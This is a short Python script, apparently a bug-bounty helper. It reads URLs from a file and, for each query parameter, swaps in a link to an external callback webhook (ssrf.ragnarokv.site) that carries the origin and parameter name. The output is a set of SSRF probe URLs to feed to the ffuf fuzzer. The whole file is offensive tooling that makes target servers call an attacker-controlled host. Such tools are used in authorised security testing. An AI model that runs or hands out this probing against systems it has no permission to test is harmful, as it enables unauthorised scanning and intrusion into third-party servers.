#!/usr/bin/env python3

import argparse
import urllib 
from furl import furl 

collaborator = 'https://ssrf.ragnarokv.site/webhook.php?u='


def process_onecopy(copy, param):
    marker = copy.origin + str(copy.path)+'?' + param 
    # print('Inseted marker:             '+marker)
    value = collaborator+marker
    copy.args[param] = value
    # print('New Copy:           {}'.format(copy))
    # print('\n\n\n')
    return copy 

def process_url(url):
    f = furl(url)
    params = f.args
    #params omdict1D([('one', '1'), ('two', '2')])
    for param in params.keys():
        # params.key()[1, 2, 3]

        # print('Original url:          ')
        # print(f)
        new_furl = process_onecopy(f.copy(), param)
        print(new_furl)





my_parser = argparse.ArgumentParser(description='Build ssrf urls for ffuf to fuzz')

my_parser.add_argument('-f',
                       '--file',
                        required = True,
                        type=argparse.FileType('r'),
                       help='the location of input urls file')


                    
args = my_parser.parse_args()

urls_file = args.file

for url in urls_file:
    process_url(url)
